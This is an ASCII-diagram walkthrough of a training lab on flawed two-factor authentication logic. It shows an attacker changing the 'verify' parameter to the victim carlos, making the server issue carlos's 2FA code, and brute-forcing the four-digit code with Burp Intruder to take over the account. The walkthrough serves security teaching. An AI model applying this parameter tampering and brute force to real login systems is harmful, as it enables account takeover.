Lab#8 2FA broken logic

================================================================================
          LAB: 2FA BROKEN LOGIC (VISUAL WALKTHROUGH)
================================================================================

[ YOU ] ---> wiener:peter  (Your Credentials)
[TARGET] ---> carlos        (Victim Username)

--------------------------------------------------------------------------------
STEP 1: ANALYSE LOGIC (Log in as yourself)
--------------------------------------------------------------------------------

  Browser                       Burp Suite Proxy                 Web Server

    |                                  |                             |
    |-- POST /login (wiener) --------->|                             |
    |                                  |-- POST /login ------------->|
    |                                  |<-- 302 Redirect to /login2 -|
    |<-- Redirects to 2FA Page --------|                             |
    |                                  |                             |
    |-- POST /login2 (Enters Code) --->|                             |
    |                                  |   [ INSPECT REQUEST ]       |
    |                                  |   verify=wiener             | <--- flawed
    |                                  |   mfa-code=1234             |      logic!
    |                                  |                             |

--------------------------------------------------------------------------------
STEP 2: TRIGGER VICTIM'S CODE (Generate Carlos's 2FA)
--------------------------------------------------------------------------------

  Burp Repeater                                                  Web Server

    |                                                                |
    |-- GET /login2?verify=carlos ---------------------------------->|
    |                                                                | (Generates 2FA
    |                                                                |  code for Carlos)

--------------------------------------------------------------------------------
STEP 3: BRUTE-FORCE ATTACK (Poison session & attack)
--------------------------------------------------------------------------------

  Browser                       Burp Intruder                    Web Server

    |                                  |                             |
    |-- Enters wrong code ------------>|                             |
    |                                  |   [ SETUP INTRUDER ]        |
    |                                  |   verify=carlos             |
    |                                  |   mfa-code=§0000§           |
    |                                  |   (Payloads: 0000-9999)     |
    |                                  |                             |
    |                                  |-- POST /login2 (0001) ----->|
    |                                  |-- POST /login2 (0002) ----->|
    |                                  |-- POST /login2 (9999) ----->|
    |                                  |                             |
    |                                  |<-- 302 Found (Valid Code!) -|

--------------------------------------------------------------------------------
STEP 4: ACCESS ACCOUNT (Lab Solved)
--------------------------------------------------------------------------------

  Burp Intruder                 Browser                          Web Server

    |                              |                                 |
    |-- Right-click 302 Response ->|                                 |
    |   "Show in browser"          |                                 |
    |                              |-- Paste URL ------------------->|
    |                              |<-- Loaded Account Page ---------|
    |                              |                                 |
    |                              |   [ CLICK: "My account" ]       | 
    |                              |   *** LAB SOLVED ***            |
================================================================================
